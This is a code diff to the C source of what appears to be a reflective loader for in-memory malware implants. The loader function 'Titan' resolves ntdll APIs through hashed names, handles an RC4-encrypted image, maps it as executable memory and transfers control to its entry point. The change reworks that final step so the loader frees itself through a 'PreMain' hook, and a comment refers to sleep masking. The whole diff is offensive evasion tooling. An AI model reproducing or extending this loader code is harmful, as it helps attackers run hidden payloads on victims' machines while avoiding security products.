@@ -10,24 +10,16 @@
 
 #include "Common.h"
 
-typedef BOOLEAN ( WINAPI * DLLMAIN_T )(
-		HMODULE	ImageBase,
-		DWORD	Reason,
-		LPVOID	Parameter
-);
-
 typedef struct
 {
 	D_API( NtAllocateVirtualMemory );
 	D_API( NtProtectVirtualMemory );
-	D_API( NtQueryVirtualMemory );
 	D_API( NtFreeVirtualMemory );
 	D_API( RtlAllocateHeap );
 } API, *PAPI;
 
 #define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMemory */
 #define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
-#define H_API_NTQUERYVIRTUALMEMORY		0x10c0e85d /* NtQueryVirtualMemory */
 #define H_API_NTFREEVIRTUALMEMORY		0x2802c609 /* NtFreeVirtualMemory */
 #define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
 #define H_API_NTCLOSE				0x40d6e69d /* NtClose */
@@ -50,8 +42,8 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 {
 	API				Api;
 	ARC4_CTX			Rc4;
-	MEMORY_BASIC_INFORMATION	Mbi;
 
+	ULONG				Aoe = 0;
 	SIZE_T				Prm = 0;
 	SIZE_T				SLn = 0;
 	SIZE_T				ILn = 0;
@@ -64,7 +56,6 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 	PVOID				Map = NULL;
 	PTABLE				Tbl = NULL;
 	PCONFIG				Cfg = NULL;
-	DLLMAIN_T			Ent = NULL;
 	PIMAGE_DOS_HEADER		Dos = NULL;
 	PIMAGE_NT_HEADERS		Nth = NULL;
 	PIMAGE_SECTION_HEADER		Sec = NULL;
@@ -72,12 +63,10 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Rc4, sizeof( Rc4 ) );
-	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );
 
 	/* Initialize API structures */
 	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
 	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
-	Api.NtQueryVirtualMemory    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
 	Api.NtFreeVirtualMemory     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
 	Api.RtlAllocateHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 
@@ -167,13 +156,12 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 
 				/* Change Memory Protection. note: Work on supporting SLEEP_MASK here! */
 				if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
-					if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_SYM( Start ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
-						ELn = 0;
-						Ent = C_PTR( U_PTR( Map ) + Nth->OptionalHeader.AddressOfEntryPoint );
-						if ( NT_SUCCESS( Api.NtFreeVirtualMemory( NtCurrentProcess(), &Enc, &ELn, MEM_RELEASE ) ) ) {
-							Ent( C_PTR( Map ), 1, NULL );
-							Ent( C_PTR( Mbi.AllocationBase ), 4, NULL );
-						};
+					/* Set the values we need! */
+					ELn = 0;
+					Aoe = Nth->OptionalHeader.AddressOfEntryPoint;
+					if ( NT_SUCCESS( Api.NtFreeVirtualMemory( NtCurrentProcess(), &Enc, &ELn, MEM_RELEASE ) ) ) {
+						/* Call the "PreMain" to ensure that the ReflectiveLoader is freed! */
+						( ( __typeof__( PreMain ) * ) PTR_TO_HOOK( Mem, PreMain ) )( Map, Aoe );
 					};
 				};
 			};
